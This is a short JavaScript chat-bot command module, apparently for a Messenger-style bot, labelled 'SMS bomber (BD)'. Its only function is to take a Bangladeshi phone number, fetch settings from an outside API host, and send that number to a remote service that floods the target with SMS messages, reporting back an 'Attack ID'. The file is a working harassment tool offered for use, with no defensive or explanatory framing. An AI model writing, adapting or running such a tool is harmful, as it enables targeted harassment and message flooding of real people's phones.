const axios = require("axios");
const API_BASE = "https://hridoy-api.vercel.app";
module.exports = {
  config: { name: "sms", version: "2.1", author: "HR ID OY", countDown: 15, role: 2, shortDescription: { en: "SMS bomber (BD)" }, category: "Utility", guide: { en: ".sms bom 01xxxxxxxxx" } },
  onStart: async function ({ event, message, args }) {
    const sub = args[0], number = args[1];
    if (sub !== "bom") return message.reply("Usage:\n.sms bom 01xxxxxxxxx");
    if (!number || !/^01[0-9]{9}$/.test(number)) return message.reply("📵 BD নাম্বার দিন\nউদাহরণ: .sms bom 01xxxxxxxxx");
    await message.reply(`📡 Sending request...\n📩 Target: ${number}`);
    const config = (await axios.get(`${API_BASE}/api/links/sms`)).data;
    const res = await axios.get(`${config.url}?${config.queryParam}=${number}`, { timeout: 15000 });
    const data = res.data;
    if (!data || data.success !== true) return message.reply("❌ API response unsuccessful");
    return message.reply(`✅ Request accepted\n🆔 Attack ID: ${data[config.responseKey] || "N/A"}\nℹ️ Message: ${data.message || "No message"}`);
  }
};
